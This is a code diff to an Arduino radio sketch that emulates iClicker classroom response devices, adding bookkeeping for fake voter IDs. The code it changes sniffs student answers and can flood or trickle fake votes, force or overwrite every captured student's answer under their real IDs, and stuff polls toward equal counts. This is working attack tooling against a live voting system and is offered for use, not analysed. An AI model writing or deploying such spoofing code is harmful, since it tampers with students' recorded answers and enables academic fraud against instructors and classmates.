@@ -24,6 +24,12 @@ void expandId(uint32_t id, uint8_t* ida) {
   ida[2] = (id & 0x0000ff00) >> 8;
   ida[3] =  id & 0x000000ff;
 }
+void expandBogusId(uint32_t id, uint8_t* ida) {
+  ida[0] = (id & 0xff0000) >> 16;
+  ida[1] = (id & 0x00ff00) >> 8;
+  ida[2] =  id & 0x0000ff;
+  ida[3] = ida[0] ^ ida[1] ^ ida[2];
+}
 
 // Radio properties
 #define IS_RFM69HW true //make true if using w version
@@ -61,15 +67,23 @@ int poll[5];
 int nResponses;
 
 // Maintain hash map for unique IDs
-hashTable<char> responses(100); // Probably at most 300 responses? 100 should be a good size...
+hashTable<char> responses(200);
+// Probably at most 300 legit responses
 
-// user id hash table size: 400
-// bogus hash size: 4000
+// Track bogusResponses
+uint32_t baseBogusID = 0xBBAA11;
+uint32_t bogusID = baseBogusID;
+int nBogusIDs = 0;
+
+// Seperate poll for bogus responses
+int bogusPoll[5];
 
 // Poll methods
 void resetPoll() {
-  for(int i = 0; i < 5; i++)
+  for(int i = 0; i < 5; i++) {
     poll[i] = 0;
+    bogusPoll[i] = 0;
+  }
   nResponses = 0;
   responses.clear();
 }
@@ -85,6 +99,16 @@ void updatePoll(uint8_t* id, char a) {
   }
   // We know a >= 'A' && a <= 'E'
   poll[a - 65]++;
+}
+void updatePollBogus(char a) {
+  bogusPoll[a - 65]++;
+}
+void updatePollBogus(iClickerAnswer a) {
+  bogusPoll[a]++;
+}
+void clearBogusPoll() {
+  for(int i = 0; i < 5; i++)
+    bogusPoll[i] = 0;
 }
 
 // Operation
@@ -147,15 +171,20 @@ void handlePackets() {
     uint8_t* id = r.packet.answerPacket.id;
     iClickerAnswer ans = r.packet.answerPacket.answer;
     char answer = iClickerEmulator::answerChar(ans);
-    snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' :
-      'r', id[0], id[1], id[2], id[3], answer);
-    Serial.println(msg);
-    if(operation == force) {
+    if(operation == force && answer != operationMode && answer != 'P') { // todo ignore X?
+      snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c -> %c", r.type == PACKET_ANSWER ?
+        'a' : 'r', id[0], id[1], id[2], id[3], answer, operationMode);
+      Serial.println(msg);
       Clicker.submitAnswer(id, Answers[operationMode - 'a']);
       updatePoll(id, operationMode);
       // Promiscuous is re-engaged later in loop...
-    } else if(answer != 'P' && answer != 'X') // answer is in {'A', 'B', 'C', 'D', 'E', 'P', 'X'}
+    } else if(answer != 'P' && answer != 'X') {
+      // answer is in {'A', 'B', 'C', 'D', 'E'}
+      snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' :
+        'r', id[0], id[1], id[2], id[3], answer);
+      Serial.println(msg);
       updatePoll(id, answer);
+    }
   }
 }
 
@@ -266,11 +295,16 @@ void handleCommand() {
     }
   } else if(cEquals(UBuf, "status")) {
     Serial.printf("Responses: %d\n", nResponses);
+    Serial.printf("Bogus responses: %d\n", nBogusIDs);
     // Print out poll status
     for(int i = 0; i < 5; i++) {
       Serial.print((char)(i + 65));
-      Serial.print(" - ");
-      Serial.println(poll[i]);
+      Serial.print(" -\t");
+      Serial.print(poll[i]);
+      Serial.print("\t");
+      Serial.print(bogusPoll[i]);
+      Serial.print("\t");
+      Serial.println(poll[i] + bogusPoll[i]);
     }
     // Some system info
     printFreeMemory();
@@ -320,7 +354,7 @@ void handleCommand() {
     // Only really need to look at first char
     if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
         UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
-      operation = flood;
+      operation = trickle;
       operationMode = UBuf[0];
       operationCounter = 0;
       seqCounter = 0;
@@ -390,8 +424,10 @@ void recvPacketHandler(iClickerPacket *recvd) {
 void command_flood() {
   // Flood the base station with a ton of answers
   // Not DDOS level, but a lot
-  // Send about 200 responses per second
+  // Sends about 200 responses per second
   // ~20 per loop
+  char msg[50];
+  uint8_t id[4];
   for(int i = 0; i < 20; i++) {
     iClickerAnswer answer;
     switch(operationMode) {
@@ -433,16 +469,21 @@ void command_flood() {
         seqCounter = (seqCounter + 1) % 5;
         break;
     }
-    uint8_t id[4];
-    iClickerEmulator::randomId(id);
+    expandBogusId(bogusID++, id);
+    nBogusIDs++;
     Clicker.submitAnswer(id, answer);
-    updatePoll(id, answer);
+    updatePollBogus(answer);
+    snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
+      iClickerEmulator::answerChar(answer));
+    Serial.println(msg);
   }
 }
 
 void command_trickle() {
   // Slowly sends bogus answers to base station
-  // Send about 5 per second
+  // Sends about 5 per second
+  char msg[50];
+  uint8_t id[4];
   operationCounter++;
   if(operationCounter %= 2) {
     iClickerAnswer answer;
@@ -485,10 +526,13 @@ void command_trickle() {
         seqCounter = (seqCounter + 1) % 5;
         break;
     }
-    uint8_t id[4];
-    iClickerEmulator::randomId(id);
+    expandBogusId(bogusID++, id);
+    nBogusIDs++;
     Clicker.submitAnswer(id, answer);
-    updatePoll(id, answer);
+    updatePollBogus(answer);
+    snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
+      iClickerEmulator::answerChar(answer));
+    Serial.println(msg);
   }
 }
 
@@ -496,19 +540,36 @@ void command_changeall() {
   // Changes all answers to a given answer
   // Changes both student IDs and fake IDs
   // Just do it all in one go. Hopefully don't miss too much in the process...
+  char msg[50];
   if(operationMode >= 'a' && operationMode <= 'e') {
     iClickerAnswer answer = Answers[operationMode - 'a'];
     list<int>* keys = responses.getKeys();
     listNode<int>* node = keys->getHead();
-    int id;
+    uint32_t id;
     uint8_t ida[4];
     if(node != null)
       do {
         id = node->getContent();
         expandId(id, ida);
         Clicker.submitAnswer(ida, answer);
+        // TODO: make message say oldAns -> newAns
+        snprintf(msg, sizeof(msg), "[->][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
+          ida[3], iClickerEmulator::answerChar(answer));
+        Serial.println(msg);
         updatePoll(ida, operationMode);
       } while(node = node->getNext());
+    clearBogusPoll();
+    id = baseBogusID;
+    Serial.println(nBogusIDs);
+    for(int i = 0; i < nBogusIDs; i++) {
+      expandBogusId(id++, ida);
+      Clicker.submitAnswer(ida, answer);
+      updatePollBogus(answer);
+      // TODO: make message say oldAns -> newAns
+      snprintf(msg, sizeof(msg), "[*>][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
+        ida[3], iClickerEmulator::answerChar(answer));
+      Serial.println(msg);
+    }
   } else {
     // then uniform
     int answer = 0;
@@ -521,10 +582,29 @@ void command_changeall() {
         id = node->getContent();
         expandId(id, ida);
         Clicker.submitAnswer(ida, Answers[answer % 5]);
+        // TODO: make message say oldAns -> newAns
+        snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
+          ida[3], iClickerEmulator::answerChar(Answers[answer % 5]));
+        Serial.println(msg);
         updatePoll(ida, iClickerEmulator::answerChar(Answers[answer % 5]));
         answer++;
       } while(node = node->getNext());
+    clearBogusPoll();
+    id = baseBogusID;
+    for(int i = 0; i < nBogusIDs; i++) {
+      expandBogusId(id++, ida);
+      Clicker.submitAnswer(ida, Answers[answer % 5]);
+      // TODO: make message say oldAns -> newAns
+      snprintf(msg, sizeof(msg), "[*>][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
+        ida[3], iClickerEmulator::answerChar(Answers[answer % 5]));
+      Serial.println(msg);
+      updatePollBogus(Answers[answer % 5]);
+      answer++;
+    }
   }
+  // Finished, reset operation
+  Serial.println("Finished changeall");
+  operation = idle;
 }
 
 void command_eq() {
@@ -532,15 +612,21 @@ void command_eq() {
   // About 160 responses per second max
   int max = 0;
   for(int i = 0; i < 5; i++)
-    if(poll[i] > max)
-      max = poll[i];
+    if(poll[i] + bogusPoll[i] > max)
+      max = poll[i] + bogusPoll[i];
   uint8_t id[4];
+  char msg[50];
+  // TODO: This is bad when histogram is equalized...
   for(int i = 0; i < 4; i++)
     for(int j = 0; j < 5; j++)
-      if(poll[j] < max) {
-        iClickerEmulator::randomId(id);
+      if(poll[j] + bogusPoll[j] < max) {
+        expandBogusId(bogusID++, id);
+        nBogusIDs++;
         Clicker.submitAnswer(id, Answers[j]);
-        updatePoll(id, Answers[j]);
+        updatePollBogus(Answers[j]);
+        snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
+          iClickerEmulator::answerChar(Answers[j]));
+        Serial.println(msg);
       }
 }
 
@@ -590,11 +676,18 @@ void setup() {
   Serial.println("Started promiscouous.");
   // Print help message
   printHelpMessage();
+
+  //
+  //for(int i = 0; i < 5; i++) {
+  //  Serial.print(iClickerEmulator::answerChar(Answers[i]));
+  //  Serial.print(" - ");
+  //  Serial.println((int)Answers[i]);
+  //}
 }
 
 void loop() {
   // Blink led
-  //digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);
+  digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);
 
   // Process packets
   handlePackets();
@@ -628,7 +721,6 @@ void loop() {
         command_ddos();
         break;
     }
-    // TODO: Book keeping of bogus answers
     // All operations involve transmission. Promiscouous mode needs to be restarted.
     Clicker.setChannel(Channel);
     Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
